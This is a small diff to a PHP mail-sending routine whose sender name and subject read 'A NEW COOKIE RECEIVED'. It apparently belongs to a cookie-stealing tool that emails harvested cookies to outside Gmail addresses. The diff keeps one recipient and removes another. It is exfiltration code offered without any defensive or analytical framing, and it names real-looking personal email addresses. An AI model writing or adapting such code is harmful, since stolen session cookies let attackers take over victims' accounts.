@@ -29,7 +29,6 @@
   
   $mail->setFrom('carterreginald24@gmail.com', 'A NEW COOKIE RECEIVED');
   $mail->addAddress('kk442242@gmail.com', 'Receiver');
-  $mail->addAddress('raziqahmed23@gmail.com', 'Receiver');
   $mail->Subject = 'A NEW COOKIE RECEIVED';
   $mail->Body    = 'Please check the link below for more details
 
